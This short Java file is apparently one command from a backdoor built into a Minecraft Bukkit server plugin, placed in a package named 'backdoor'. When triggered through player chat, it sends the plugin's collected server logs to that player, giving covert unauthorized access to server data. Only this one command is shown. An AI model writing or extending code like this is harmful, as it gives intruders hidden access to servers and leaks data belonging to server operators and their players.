package me.tsb.backdoor.commands;

import me.tsb.backdoor.Command;
import me.tsb.plugin.Main;
import org.bukkit.event.player.PlayerChatEvent;

import java.util.ArrayList;

public class GetLogsCommand extends Command {

    @Override
    public void onExec(PlayerChatEvent event, ArrayList<String> args) {

        event.getPlayer().sendMessage(Main.logger.getLogs());
    }
}
